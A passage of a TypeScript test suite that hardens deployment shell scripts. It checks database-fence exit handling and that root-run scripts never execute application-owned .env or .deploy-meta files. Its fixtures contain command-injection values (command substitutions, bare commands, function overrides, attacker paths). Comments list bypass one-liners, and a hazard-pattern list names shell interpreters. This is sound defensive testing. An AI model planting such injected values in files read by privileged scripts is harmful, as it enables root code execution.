    const body = shellFunction(entry.source, 'install_reboot_fence')
    assert.ok(
      !/cat\s*>\s*"?\$\{?(dropin|FENCE_DROPIN_FILE)/.test(body),
      `${entry.name}: install_reboot_fence() truncates the drop-in in place instead of publishing it:\n${body}`,
    )
    assert.match(
      body,
      /publish_durable_dropin/,
      `${entry.name}: install_reboot_fence() must publish the drop-in durably`,
    )
    // And the result must be acted on: a `|| true` here is exactly the r10 defect one file over.
    assert.ok(
      /if ! publish_durable_dropin/.test(body),
      `${entry.name}: the publisher's return value must gate the install:\n${body}`,
    )
    assert.match(
      body,
      /rollback_reboot_fence_install\n?\s*return 1/,
      `${entry.name}: a failed drop-in publication must roll back and refuse, not warn`,
    )
  }
})

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (Codex r13, HIGH) — "THE FENCE DID NOT EXIT 0" WAS READ AS "NO FENCE WAS RAISED".
//
// fence-db-connections.mjs COMMITS its REVOKEs and then asks whether the door is actually shut.
// When the application keeps CONNECT through role membership, or the room will not go quiet, it
// DELIBERATELY LEAVES THEM STANDING so nothing is half-applied — PUBLIC, monitoring, backup, BI
// and any second application are locked out at that moment. That used to arrive as the same exit
// 1 a failure which revoked NOTHING produces, and DB_FENCE_RAISED was set only on exit 0. So the
// run recorded itself as having raised no fence; a record lost during cleanup then met the
// exit-4 arm with the flag false, took the warning-success branch, lowered DB_FENCE_UP and let
// the marker claim a release nobody performed, over grantees still revoked and now unrecorded.
//
// An exit code is not evidence about what was committed, so the script now has one that IS:
// exit 5, EXIT_FENCE_STANDING. These run the shipped functions in a shell whose EXIT trap
// releases, exactly as the real ones do, and watch what the release decides.
// ---------------------------------------------------------------------------

/** A fence stub that answers each mode with its own exit code, and logs what it was asked. */
function fenceStubByMode(dir: string, codes: { fence: number; release: number }): void {
  writeFenceCheckout(
    dir,
    [
      "import { appendFileSync } from 'node:fs'",
      `appendFileSync(${JSON.stringify(join(dir, 'calls.log'))}, process.argv.slice(2).join(' ') + '\\n')`,
      `if (process.argv.includes('--release')) process.exit(${codes.release})`,
      `process.exit(${codes.fence})`,
      '',
    ].join('\n'),
  )
}

for (const entry of FENCE_HARNESS) {
  test(`${entry.name} treats a lost record as fatal after a fence that COMMITTED its revokes and could not be called good`, () => {
    // The whole sequence, in one shell: --fence exits 5 (revokes committed, fence ineffective),
    // the entrypoint aborts, and the EXIT trap's release finds no record and can prove only the
    // application role's own CONNECT (exit 4).
    const dir = mkdtempSync(join(tmpdir(), 'ims-fence5-'))
    try {
      fenceStubByMode(dir, { fence: 5, release: 4 })
      const program = [
        'set -uo pipefail',
        entry.preamble(dir),
        'error() { echo "ERROR: $*" >&2; }',
        'DB_FENCE_RAISED=false',
        CUTOVER_DIR_PRIMITIVES,
        shellFunction(entry.source, 'fence_db_connections'),
        shellFunction(entry.source, 'release_db_connections'),
        'on_exit() { if release_db_connections; then echo "TRAP RELEASE SAID OK"; else echo "TRAP RELEASE REFUSED"; fi; }',
        'trap on_exit EXIT',
        'fence_db_connections',
        'echo "REACHED THE MIGRATION"',
      ].join('\n')
      const result = runShell(program)

      // MUTATION ROUTE: delete the `5)` arm from fence_db_connections() so exit 5 falls through
      // to the catch-all `*)`. DB_FENCE_RAISED stays false, the exit-4 arm takes its
      // warning-success branch and 'TRAP RELEASE SAID OK' is printed instead.
      assert.match(calls(dir), /--fence/, 'precondition: the fence was attempted')
      assert.match(calls(dir), /--release/, 'and the cleanup asked the database')
      assert.ok(!result.output.includes('REACHED THE MIGRATION'), 'exit 5 must abort like exit 3 does')
      // "MAY BE standing": exit 5 now also covers a COMMIT whose acknowledgement was lost, where
      // the transaction's fate is unknown and unknown is not the not-committed case (o3d-2sm1.5,
      // Codex r14 HIGH). What the entrypoint must say either way is that this run may have
      // changed the database — never that nothing happened.
      assert.match(result.output, /FENCE MAY BE STANDING/, 'and say the revokes may be in force, not that nothing happened')
      assert.match(result.output, /TRAP RELEASE REFUSED/, 'a record lost under a committed fence is not releasable')
      assert.ok(!result.output.includes('TRAP RELEASE SAID OK'), 'and must never be walked past')
      assert.match(result.output, /RECORD IS GONE/, 'with the grantees it can no longer name')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  test(`${entry.name} raises the sticky flag when the exit trap's re-fence commits revokes it cannot prove`, () => {
    // The same defect on the recovery path. refence_db_connections() collapsed every non-zero
    // into `return 1`, so a re-fence that committed its revokes and could not call them a fence
    // left DB_FENCE_RAISED false — and the release that follows in the same trap read its own
    // "unproven" verdict as permission to continue.
    //
    // `set -e` is deliberately off: install.sh's re-fence opens with `${DB_FENCE_UP} && return 0`,
    // which is a failing AND-list, and the harness must not exit on it before reaching the code
    // under test.
    const dir = mkdtempSync(join(tmpdir(), 'ims-refence5-'))
    try {
      fenceStubByMode(dir, { fence: 5, release: 4 })
      const program = [
        'set -uo pipefail',
        entry.preamble(dir),
        'error() { echo "ERROR: $*" >&2; }',
        'DB_FENCE_RAISED=false',
        // THE RECOVERY PATH, which is the only path this function is reached from: the migration
        // has run. Since r23 that is also what tells the re-fence not to re-ask the unit-source
        // START gate, so it has to be stated rather than left unset.
        'SCHEMA_TOUCHED=true',
        shellFunction(entry.source, 'refence_db_connections'),
        shellFunction(entry.source, 'release_db_connections'),
        'refence_db_connections || echo "REFENCE REPORTED FAILURE"',
        'if release_db_connections; then echo "RELEASE SAID OK"; else echo "RELEASE REFUSED"; fi',
      ].join('\n')
      const result = runShell(program)

      // MUTATION ROUTE: remove the `-eq 5` block from refence_db_connections() so it falls back
      // to `[[ "$rc" -eq 0 ]] || return 1`. DB_FENCE_RAISED stays false and 'RELEASE SAID OK'
      // is printed.
      assert.match(result.output, /REFENCE REPORTED FAILURE/, 'a fence it cannot prove is still not a success')
      assert.match(result.output, /COMMITTED ITS REVOKES/, 'and it must say what it did leave behind')
      assert.match(result.output, /RELEASE REFUSED/, 'so the release that follows cannot be walked past')
      assert.ok(!result.output.includes('RELEASE SAID OK'), 'which is the branch the flag exists to prevent')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
}

// ---------------------------------------------------------------------------
// o3d-2sm1.5 r25, Codex CRITICAL — THE APPLICATION'S OWN FILES EXECUTED INSIDE THE ROOT SHELL.
//
// r24's answer to "the application-owned .env decided where the root-protected snapshot went"
// was to snapshot every IMS_* deploy-control variable from the root invocation and restore it
// after the source. That repairs the VALUES and not the EXECUTION, and the execution is the
// finding: `source` runs a file. `EVIL=$(id > /tmp/x)`, a bare command on a line of its own, a
// redefinition of run_as_user(), `SERVICE_UNIT=attacker.service`, `APP_DIR=…`, or an assignment
// straight into `DEPLOY_CONTROL_SAVED[...]` all took effect AS ROOT, before the restore loop ran
// — and none of SERVICE_UNIT, APP_DIR or DEPLOY_META_FILE was in the restored list anyway.
//
// So both `source` calls are gone. update.sh reads the five names it needs out of the two files
// by name, with env_file_value() — install.sh's and deploy.sh's reader, moved to the top of
// update.sh so the preflight load and every later re-read go through ONE parser. The r24
// capture/restore went with them: with nothing sourced, no application-owned byte reaches this
// shell's variables, so IMS_* can only come from the root invocation.
//
// The tests below run the script's OWN PRELUDE against real hostile files. They are the reason
// the claim is allowed to be "not executed" rather than "restored afterwards".
// ---------------------------------------------------------------------------

/** The lines of a script from the top down to and including the last top-level path assignment. */
function preludeThrough(lines: string[], lastAssignment: RegExp): string {
  const end = lines.findIndex((line) => lastAssignment.test(line))
  assert.notEqual(end, -1, 'the prelude must still contain the assignment it is cut at')
  return lines.slice(0, end + 1).join('\n')
}

/**
 * Run update.sh's prelude — everything from line 1 to the last top-level path assignment — with
 * `--dry-run` (which is what lets it run unprivileged) against a real ${APP_DIR}, and echo the
 * resolved values of `names` through the script's own variables.
 *
 * IMS_APP_DIR comes from the ROOT INVOCATION's environment, which is the one source that
 * legitimately steers this script; `extraEnv` is how a test supplies more of it.
 */
function runUpdatePrelude(dir: string, names: string[], extraEnv = ''): { status: number; output: string } {
  const program = [
    preludeThrough(UPDATE_LINES, /^DB_OBJECT_ACCESS_SCRIPT=/),
    ...names.map((name) => `echo "${name}=\${${name}-<unset>}"`),
  ].join('\n')
  // WRITTEN TO A FILE BESIDE A `lib`, NOT PIPED INTO `bash -s` (o3d-2sm1.5 r31). The prelude now
  // sources scripts/lib/db-fence-protected.sh through ${BASH_SOURCE[0]}, which is how it reaches
  // the copy that shipped with THIS script rather than one under an application directory that
  // could be pointed anywhere. A script read from stdin has no BASH_SOURCE path at all, so the
  // harness gives it one — a throwaway directory whose `lib` is a symlink to the repository's.
  // The alternative, an IMS_* override for the library path, would be a variable that chooses
  // which code root executes, which is the whole class of thing this round is closing.
  const stage = mkdtempSync(join(tmpdir(), 'ims-prelude-'))
  try {
    symlinkSync(join(process.cwd(), 'scripts/lib'), join(stage, 'lib'))
    const script = join(stage, 'update-prelude.sh')
    writeFileSync(script, `${program}\n`)
    return runShell(`${extraEnv} IMS_APP_DIR=${JSON.stringify(dir)} bash ${JSON.stringify(script)} --dry-run`)
  } finally {
    rmSync(stage, { recursive: true, force: true })
  }
}

test('the environment snapshot lives at a literal path in all three entrypoints, not behind an override', () => {
  // MUTATION ROUTE: put `${IMS_CUTOVER_ENV_DIR:-...}` back in any one of the three and the
  // equality below fails, naming the script that reintroduced it.
  for (const entry of R9_SCRIPTS) {
    // Read through shellConstant() rather than by line prefix (o3d-secops): the declaration is
    // `readonly` now, and it also has to stay the ONLY script-scope assignment, which is what
    // shellConstant() refuses a second one for.
    const line = shellConstant(entry.source, 'DB_ENV_SNAPSHOT_DIR', entry.name)
    assert.equal(
      line,
      'readonly DB_ENV_SNAPSHOT_DIR="/etc/ims-cutover"',
      `${entry.name} must resolve the snapshot directory to a literal: an override only a root-owned source may set is indistinguishable from no override, and one an app-owned source CAN set is the finding`,
    )
  }
  // And nothing anywhere still reads the variable, including the messages that used to tell an
  // operator to set it.
  for (const entry of R9_SCRIPTS) {
    const reads = entry.source
      .split(/\r?\n/)
      .filter((line) => !/^\s*#/.test(line))
      .filter((line) => line.includes('IMS_CUTOVER_ENV_DIR'))
    assert.deepEqual(reads, [], `${entry.name} still reads IMS_CUTOVER_ENV_DIR outside a comment: ${reads}`)
  }
})

test('nothing in the application-owned .env is EXECUTED by update.sh, and the values it needs still arrive', () => {
  // THE LOAD-BEARING ONE. The .env below is not a file with an awkward value in it — it is a
  // file with SHELL CODE in it, of every shape the old `source` would have run as root:
  //
  //   a command substitution in an ordinary-looking assignment,
  //   a bare command on a line of its own,
  //   a redefinition of one of the functions the prelude defines above the load,
  //   an assignment to a privileged variable that r24 never restored (SERVICE_UNIT, APP_DIR,
  //     DEPLOY_META_FILE),
  //   an assignment INTO r24's own saved array, which is Codex's exact case: the restore would
  //     then have installed the attacker's path,
  //   and the IMS_* namespace overrides r24 was written for.
  //
  // Each of the first three leaves a FILE behind if it ran, so "was it executed" is answered by
  // the filesystem and not by parsing output.
  //
  // MUTATION ROUTE (verified against the pre-fix script, not asserted from reading it): restore
  // `set -a; source "${APP_DIR}/.env"; set +a` at the load and all three marker files appear and
  // SERVICE_UNIT comes back as attacker.service.
  const dir = mkdtempSync(join(tmpdir(), 'ims-envexec-'))
  try {
    const marker = (name: string) => join(dir, name)
    writeFileSync(
      join(dir, '.env'),
      [
        'DATABASE_URL=postgresql://app:pw@127.0.0.1:5432/ims',
        'DEPLOY_ADMIN_DATABASE_URL="postgresql://admin:pw@127.0.0.1:5432/ims"  # the privileged one',
        `EVIL_SUBSTITUTION=$(touch ${JSON.stringify(marker('EXECUTED-substitution'))})`,
        `touch ${JSON.stringify(marker('EXECUTED-command'))}`,
        `run_as_user() { touch ${JSON.stringify(marker('EXECUTED-function'))}; }`,
        // Not in r24's restored list, so the restore was no answer to any of these.
        'SERVICE_UNIT=attacker.service',
        'APP_DIR=/tmp/attacker-appdir',
        'DEPLOY_META_FILE=/tmp/attacker-meta',
        // Codex's array case: mutate the snapshot the restore reads back.
        'DEPLOY_CONTROL_SAVED[IMS_CUTOVER_STATE_DIR]=/tmp/attacker-array',
        // And the r24 namespace overrides, which must still be ignored.
        'IMS_CUTOVER_ENV_DIR=/tmp/attacker-owned',
        'IMS_CUTOVER_STATE_DIR=/tmp/attacker-state',
        'IMS_DEPLOY_STATE_DIR=/tmp/attacker-deploy',
        'IMS_DATA_DIR=/tmp/attacker-data',
        'IMS_LEGACY_CUTOVER_STATE_DIR=/tmp/attacker-legacy',
        '',
      ].join('\n'),
    )

    const result = runUpdatePrelude(dir, [
      'DATABASE_URL',
      'DEPLOY_ADMIN_DATABASE_URL',
      'SERVICE_UNIT',
      'APP_DIR',
      'DEPLOY_META_FILE',
      'DB_ENV_SNAPSHOT_DIR',
      'DB_ENV_SNAPSHOT_FILE',
      'DB_ENV_SNAPSHOT_DROPIN_FILE',
      'CUTOVER_STATE_DIR',
      'LEGACY_CUTOVER_STATE_DIR',
    ])

    assert.equal(result.status, 0, `the prelude must run cleanly:\n${result.output}`)

    // PRECONDITION, so this cannot pass by never reading the file at all: the two values that
    // genuinely do come from .env arrived, quoting and trailing comment removed.
    assert.match(
      result.output,
      /^DATABASE_URL=postgresql:\/\/app:pw@127\.0\.0\.1:5432\/ims$/m,
      'precondition: the reader really did read this .env, so everything below was reachable',
    )
    assert.match(
      result.output,
      /^DEPLOY_ADMIN_DATABASE_URL=postgresql:\/\/admin:pw@127\.0\.0\.1:5432\/ims$/m,
      'and the privileged connection arrived unquoted and without its trailing comment',
    )

    // NOT EXECUTED. Three shapes of shell code, three files that do not exist.
    for (const name of ['EXECUTED-substitution', 'EXECUTED-command', 'EXECUTED-function']) {
      assert.equal(existsSync(marker(name)), false, `${name}: the application-owned .env was EXECUTED in the root shell`)
    }

    // NOT STEERED. Nothing the file said became a variable, restored or otherwise.
    assert.match(result.output, /^SERVICE_UNIT=one-two-inventory\.service$/m, 'the unit this run acts on is not the application’s to choose')
    assert.match(result.output, new RegExp(`^APP_DIR=${dir.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'm'), 'nor the directory it reads from')
    assert.match(result.output, /^DEPLOY_META_FILE=.*\/\.deploy-meta$/m, 'nor which metadata file it reads')
    assert.match(result.output, /^DB_ENV_SNAPSHOT_DIR=\/etc\/ims-cutover$/m, 'nor the root-protected snapshot directory')
    assert.match(result.output, /^DB_ENV_SNAPSHOT_FILE=\/etc\/ims-cutover\/db-identity-snapshot\.env$/m, 'nor the file inside it')
    assert.match(
      result.output,
      /^DB_ENV_SNAPSHOT_DROPIN_FILE=\/etc\/systemd\/system\/one-two-inventory\.service\.d\/zz-deploy-db-identity\.conf$/m,
      'nor the drop-in that binds the unit to it — which update.sh used in five places and never assigned until r25, so under `set -u` publishing the binding aborted with "unbound variable"',
    )
    assert.match(result.output, /^CUTOVER_STATE_DIR=\/var\/lib\/one-two-inventory$/m, 'nor the namespace holding the marker, the cron backup, the fence record and the lock')
    assert.match(result.output, /^LEGACY_CUTOVER_STATE_DIR=\/var\/lib\/ims-deploy$/m, 'nor the legacy namespace this run IMPORTS state from')
    assert.ok(
      !/attacker/.test(result.output.replace(/^(DATABASE_URL|DEPLOY_ADMIN_DATABASE_URL)=.*$/gm, '')),
      `no path may come from the .env: ${result.output}`,
    )
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('nothing in the application-owned .deploy-meta is EXECUTED by update.sh either, and the git metadata still arrives', () => {
  // .deploy-meta is written by install.sh, owned by the application user like .env, and was
  // sourced by the same block — so it is exactly as good a way in, and Codex named it.
  //
  // MUTATION ROUTE: restore `set -a; source "${DEPLOY_META_FILE}"; set +a` and the marker file
  // appears and SERVICE_UNIT comes back as meta-attacker.service.
  const dir = mkdtempSync(join(tmpdir(), 'ims-metaexec-'))
  try {
    const marker = join(dir, 'EXECUTED-meta')
    writeFileSync(join(dir, '.env'), 'DATABASE_URL=postgresql://app:pw@127.0.0.1:5432/ims\n')
    writeFileSync(
      join(dir, '.deploy-meta'),
      [
        'INSTALL_FROM_GIT=y',
        'GIT_REPO_URL=git@github.com:one-two-3d/onetwo3d-ims.git',
        'GIT_BRANCH=production',
        'GIT_DEPLOY_KEY_ENABLED=y',
        `touch ${JSON.stringify(marker)}`,
        'SERVICE_UNIT=meta-attacker.service',
        'IMS_CUTOVER_STATE_DIR=/tmp/attacker-state',
        '',
      ].join('\n'),
    )

    const result = runUpdatePrelude(dir, [
      'GIT_REPO_URL',
      'GIT_BRANCH',
      'GIT_DEPLOY_KEY_ENABLED',
      'SERVICE_UNIT',
      'CUTOVER_STATE_DIR',
    ])

    assert.equal(result.status, 0, `the prelude must run cleanly:\n${result.output}`)
    // PRECONDITION: the file was read, so the assertions below are about a file that was reached.
    assert.match(result.output, /^GIT_REPO_URL=git@github\.com:one-two-3d\/onetwo3d-ims\.git$/m, 'precondition: the re-clone source still arrives')
    assert.match(result.output, /^GIT_BRANCH=production$/m, 'and the branch it clones')
    assert.match(result.output, /^GIT_DEPLOY_KEY_ENABLED=y$/m, 'and whether the deploy key is in play')
    assert.equal(existsSync(marker), false, 'the application-owned .deploy-meta was EXECUTED in the root shell')
    assert.match(result.output, /^SERVICE_UNIT=one-two-inventory\.service$/m, 'and it does not get to name the unit either')
    assert.match(result.output, /^CUTOVER_STATE_DIR=\/var\/lib\/one-two-inventory$/m, 'or move the cutover namespace')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('a deploy-control variable set on the root invocation still steers update.sh', () => {
  // The other half, kept from r24 with its mechanism changed: removing the capture/restore must
  // not have removed the OPERATOR's ability to move the namespace. The invocation is the one
  // source that may steer this script, and it still does — now because nothing overwrites it
  // rather than because something puts it back.
  //
  // MUTATION ROUTE: change CUTOVER_STATE_DIR's default chain to a literal and this reports
  // /var/lib/one-two-inventory instead of the operator's path.
  const dir = mkdtempSync(join(tmpdir(), 'ims-envdir-inv-'))
  try {
    writeFileSync(join(dir, '.env'), 'DATABASE_URL=postgresql://app:pw@127.0.0.1:5432/ims\nIMS_CUTOVER_STATE_DIR=/tmp/attacker-state\n')
    const result = runUpdatePrelude(dir, ['CUTOVER_STATE_DIR'], 'IMS_CUTOVER_STATE_DIR=/srv/operator-chose-this')

    assert.equal(result.status, 0, `the prelude must run cleanly:\n${result.output}`)
    assert.match(result.output, /^CUTOVER_STATE_DIR=\/srv\/operator-chose-this$/m, 'the root invocation is the source that may steer this script')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('none of the three entrypoints source an application-owned file', () => {
  // Structural, and it replaces r24's "restores every deploy-control variable" guard. That guard
  // policed a LIST that had to be kept in step with the script; this polices the property the
  // list was standing in for, and it cannot be satisfied by adding a name somewhere.
  //
  // MUTATION ROUTE: add `set -a; source "${APP_DIR}/.env"; set +a` — or a source of
  // "${DEPLOY_META_FILE}", or of any path under ${APP_DIR} — to any one of the three, and the
  // deepEqual below fails naming that script and that line.
  for (const entry of R9_SCRIPTS) {
    const sourced = entry.source
      .split(/\r?\n/)
      .filter((line) => !/^\s*#/.test(line))
      .filter((line) => /(^|[\s;{(])(source|\.)\s+"?(\$\{(APP_DIR(_REAL)?|DEPLOY_META_FILE|TMP_CLONE_WORKTREE)\}|\S*\.(env|deploy-meta))/.test(line))
    assert.deepEqual(sourced, [], `${entry.name} sources an application-owned file into a privileged shell: ${sourced}`)
  }
  // And update.sh in particular reads those two files ONLY through the non-evaluating reader.
  // r25 asserted that by filtering for `NAME="$(...)"`, which is a SHAPE and not the property:
  // the second reader that survived that round was `APP_PORT=$(grep ... | cut ...)`, unquoted, so
  // the filter never looked at it. The enumeration below replaces the shape test — see the
  // next test, which classifies EVERY mention regardless of quoting.
  const readers = UPDATE_LINES.filter((line) => !/^\s*#/.test(line)).filter((line) =>
    /env_file_value /.test(line),
  )
  assert.ok(readers.length >= 6, `update.sh must load .env and .deploy-meta by key: found ${readers.length} such reads`)
})

// ---------------------------------------------------------------------------
// EVERY MENTION, CLASSIFIED — AND CLASSIFIED WHOLE-LINE (o3d-2sm1.5 r27, Codex MEDIUM).
//
// r26 replaced a shape test with an enumeration: every non-comment line naming an
// application-owned file must match one of the shapes declared below, or the build fails.
// The enumeration was right; the MATCHING was not. It asked whether a shape appeared ANYWHERE on
// the line, so a line only had to CONTAIN something innocent to be classified by it:
//
//   [[ -f "${APP_DIR}/.env" ]] && bash "${APP_DIR}/.env"     classified as "a file-shape test"
//   echo "$(bash "${APP_DIR}/.env")"                          classified as "operator-facing text"
//   grep APP_PORT "${APP_DIR}/.env"  # env_file_value         classified as "the one reader"
//   cat $APP_DIR/.env                                         not even SEEN — no braces
//
// Every one of those executes or reads an application-owned file as root while the guard that
// exists to forbid it reports a clean build. So the matching is now two independent stages, and
// a line must survive both:
//
//   HAZARDS   constructs that make a mention line dangerous whatever else is true of it —
//             substitutions, interpreters, redirects out of the file. Checked FIRST, so a line
//             cannot buy its way past by ALSO looking like something harmless.
//   SHAPES    anchored to the ENTIRE trimmed line. `^...$`, every time. A shape can no longer be
//             a fragment of a compound command, and an inline comment is part of the line rather
//             than something the guard reads past.
//
// The bypasses above are not left as an argument: MENTION_BYPASSES below feeds each of them
// through the same two stages and requires a rejection.
// ---------------------------------------------------------------------------

/**
 * The ways any of the three scripts writes a path to an application-owned file, as a regex
 * FRAGMENT for use inside the anchored shapes. `$APP_DIR/.env` without braces is here because
 * r26's scan did not see it at all.
 */
const APP_OWNED_PATH =
  '(\\$\\{APP_DIR(_REAL)?\\}|\\$APP_DIR(_REAL)?)/\\.(env|deploy-meta)(\\.local)?|\\$\\{DEPLOY_META_FILE\\}|\\$DEPLOY_META_FILE\\b|"?\\$\\{?env_file\\}?"?'

/**
 * THE PHYSICAL LINES OF A SCRIPT, JOINED INTO THE LOGICAL ONES BASH ACTUALLY READS
 * (o3d-2sm1.5 r29, Codex MEDIUM).
 *
 * This is the guard's FOURTH escape and they all had one cause: it classified PHYSICAL lines
 * while bash executes LOGICAL ones. A trailing backslash was even accepted explicitly by the
 * operator-message shape, so
 *
 *     printf '. %s\n' "${APP_DIR}/.env" \
 *       | dash
 *
 * passed as "operator-facing text, one simple command" on its first line, and its second line was
 * never examined at all — it names no application-owned path, so the scan does not even look at
 * it. Together they are ONE pipeline that sources an application-owned file as root: exactly the
 * compound-command class the r28 grammar was written to exclude.
 *
 * The three earlier escapes were each closed by making the SHAPE stricter — anchoring it, then
 * turning its tail into a grammar. A fifth special case would have been the same move again. The
 * fix is at the level the mismatch is at: continuations are joined FIRST, and the grammar then
 * sees the whole command it is judging.
 *
 * THE JOINING RULE is bash's: a line ending in an ODD number of backslashes continues onto the
 * next (an even number is escaped backslashes, and `\\` at the end of a line is a literal
 * backslash, not a continuation). A COMMENT line does not continue — bash discards from `#` to
 * the newline and the backslash inside it is ordinary text — which also keeps a comment from
 * swallowing the code line beneath it, and these scripts are more comment than code.
 */
function logicalLines(source: string): string[] {
  const joined: string[] = []
  let pending: string | null = null
  for (const physical of source.split(/\r?\n/)) {
    const continuing: boolean = pending !== null
    const current: string = continuing ? `${pending} ${physical.replace(/^\s+/, '')}` : physical
    const trailing = /(\\+)$/.exec(physical)
    const continues = (continuing || !/^\s*#/.test(physical)) && trailing !== null && trailing[1].length % 2 === 1
    if (continues) {
      pending = current.replace(/\\$/, '').replace(/\s+$/, '')
      continue
    }
    joined.push(current)
    pending = null
  }
  // A file whose last line ends in a backslash continues onto nothing. Keep it rather than
  // dropping it: a dropped line is a line the guard does not classify.
  if (pending !== null) joined.push(pending)
  return joined
}

/** Logical lines that name an application-owned file, comments excluded. */
function appOwnedFileMentions(source: string): string[] {
  const names = new RegExp(APP_OWNED_PATH)
  return logicalLines(source)
    .filter((line) => !/^\s*#/.test(line))
    .filter((line) => names.test(line))
}

/**
 * The line with every quoted string removed — i.e. the part of it the shell reads as CODE.
 *
 * This is what makes the word-shaped hazards below honest. Inside a double-quoted string the word
 * `exec` is text (four refusal messages in these scripts contain "…whatever the file says at
 * exec…"), and so is `sh`, and so is a `<`; a scan that cannot tell the two apart either misses
 * real executions or condemns prose, and condemning prose is how a guard gets deleted. What
 * still ACTS inside double quotes — `$(…)` and a backtick — is matched against the whole line
 * instead, below.
 */
function shellCodeOnly(line: string): string {
  let out = ''
  let state: 'none' | 'double' | 'single' = 'none'
  for (let index = 0; index < line.length; index += 1) {
    const ch = line[index]
    if (state === 'none') {
      if (ch === '\\') { out += ' '; index += 1; continue }
      if (ch === '"') { state = 'double'; out += ' '; continue }
      if (ch === "'") { state = 'single'; out += ' '; continue }
      out += ch
      continue
    }
    if (state === 'double') {
      if (ch === '\\') { index += 1; continue }
      if (ch === '"') { state = 'none'; out += ' '; continue }
      continue
    }
    if (ch === "'") { state = 'none'; out += ' ' }
  }
  return out
}

/**
 * Stage one. A mention line carrying any of these is rejected outright — no shape can excuse it,
 * because each of them is a way to make the file's own bytes act. `where` says which text the
 * pattern is applied to: the whole line for the two constructs that act inside quotes as well,
 * the shell-code part for the rest.
 */
const MENTION_HAZARDS: ReadonlyArray<{ why: string; where: 'line' | 'code'; match: RegExp }> = [
  // `$(...)` is allowed for exactly two callees: the one reader, and the readlink that
  // canonicalises a PATH without opening it. Anything else — `$(bash …)`, `$(cat …)`,
  // `$(grep … | cut …)` — is a second reader or an execution. It runs inside double quotes too,
  // so it is matched against the whole line.
  { why: 'a command substitution that is not env_file_value() or readlink', where: 'line', match: /\$\((?!env_file_value |readlink -f )/ },
  // The same thing spelled the other way, and it also runs inside double quotes: that is how two
  // die messages in this tree were silently running `systemctl start` while composing their own
  // text. An escaped backtick is inert and is not matched.
  { why: 'a backtick substitution', where: 'line', match: /(^|[^\\])`/ },
  { why: 'a process substitution', where: 'code', match: /[<>]\(/ },
  // An interpreter, an evaluator, or the `source`/`.` this whole guard exists to forbid.
  { why: 'an interpreter or evaluator', where: 'code', match: /(^|[\s;&|(])(eval|exec|source|\.|bash|sh|zsh|node|python3?|perl|xargs)\s/ },
  // Reading the file by redirect rather than by name. `<<EOF` is install.sh writing the file it
  // owns and is not an input redirect, so a doubled `<` is not matched.
  { why: 'an input redirect', where: 'code', match: /(^|[^<])<(?!<)/ },
]

/**
 * ONE ARGUMENT OF ONE SIMPLE COMMAND: a double-quoted string with no embedded `"`, a
 * single-quoted string, a short option, or a bare variable expansion. Deliberately NOT a general
 * shell word — a bare word would readmit `echo safe; …`, since `safe;` is a word to a scanner
 * that does not know where a command ends.
 */
const MESSAGE_ARGUMENT = '("[^"]*"|\'[^\']*\'|-[A-Za-z]+|\\$\\{[A-Za-z_][A-Za-z0-9_]*\\}|\\$[A-Za-z_][A-Za-z0-9_]*)'

/**
 * Stage two. Each shape must match the WHOLE trimmed line, and each carries WHY it is not a
 * second reader — because that is the property being claimed.
 */
const MENTION_SHAPES: ReadonlyArray<{ why: string; match: RegExp }> = (
  [
    // THE READER, assigned to a name. The only thing in any of the three that opens one of these
    // files for its values. The optional `|| NAME=""` tail is the shape deploy.sh and install.sh
    // use to turn a failed read into an empty value.
    {
      why: 'read through env_file_value() into a name',
      match: `(local )?[A-Za-z_][A-Za-z0-9_]*="\\$\\(env_file_value [A-Z_]+ "(${APP_OWNED_PATH})"\\)"( \\|\\| [A-Za-z_][A-Za-z0-9_]*="")?`,
    },
    // The reader inside a `${NAME:-…}` default, which is how deploy.sh lets the invocation win.
    {
      why: 'read through env_file_value() as the fallback of an invocation value',
      match: `[A-Za-z_][A-Za-z0-9_]*="\\$\\{[A-Za-z_][A-Za-z0-9_]*:-\\$\\(env_file_value [A-Z_]+ "(${APP_OWNED_PATH})"\\)\\}"`,
    },
    // The reader's result handed straight to a function.
    {
      why: "read through env_file_value() into a function's argument",
      match: `[a-z_][a-z0-9_]* "\\$\\(env_file_value [A-Z_]+ "(${APP_OWNED_PATH})"\\)"( \\|\\| (true|rc=\\$\\?))?`,
    },
    // install.sh's SECOND declared reader, and the one exception this project makes. It snapshots
    // the whole previous .env so a re-run can offer it back as prompt defaults and write it back
    // VERBATIM; parsing there would change the bytes that go back into the file (a `#` inside a
    // secret is the case that bites), so it deliberately keeps them raw.
    { why: "install.sh's raw round-trip snapshot for re-run defaults", match: 'load_existing_env "\\$\\{APP_DIR\\}/\\.env"' },
    // Shape and readability tests. They stat the path; they do not open it. Anchored whole-line,
    // so `[[ -f X ]] && bash X` is not one of these — the `&&` has nowhere to live.
    { why: 'a file-shape or readability test opening a block', match: '(el)?if \\[\\[[^\\]]*\\]\\]; then' },
    { why: 'a file-shape or readability test guarding a refusal', match: '\\[\\[[^\\]]*\\]\\] \\|\\| die "[^"]*"' },
    // The path itself, assigned to a name.
    // `readonly` is one of the prefixes now (o3d-secops): ${DEPLOY_META_FILE} is a protected
    // publication constant, so its declaration carries the word bash refuses mutations with.
    { why: 'a path assignment', match: `((local|readonly) )?[A-Za-z_][A-Za-z0-9_]*="(${APP_OWNED_PATH})"` },
    // Path canonicalisation for the EnvironmentFile= comparison — readlink resolves, it does not
    // read. Spelled out in full rather than as a fragment: this is one line in each script.
    {
      why: 'readlink -f canonicalisation of the path',
      match: 'expected="\\$\\(readlink -f "\\$env_file" 2>/dev/null \\|\\| printf \'%s\' "\\$env_file"\\)"',
    },
    // Passed to a named helper that compares the PATH against systemd's view of the unit and
    // never opens it. Named, so a helper that starts reading the file has to be added here.
    {
      why: 'passed by path to env_file_is_sole_database_url_source(), which reads the UNIT',
      match: `env_file_is_sole_database_url_source "(${APP_OWNED_PATH})" "[^"]*"`,
    },
    // The second named helper of that kind (o3d-2sm1.5 r32). It writes the path INTO a root-owned
    // recovery wrapper as a literal and never opens it here; the wrapper reads it at recovery
    // time, with the same one-key reader env_file_value() uses and no `source`. Spelled out in
    // full — helper name, argument order and the warning tail — so a call that started passing
    // the file's CONTENTS, or a different helper, is not covered by this.
    {
      why: 'passed by path to db_fence_publish_operator_wrappers(), which writes it into a root-owned wrapper',
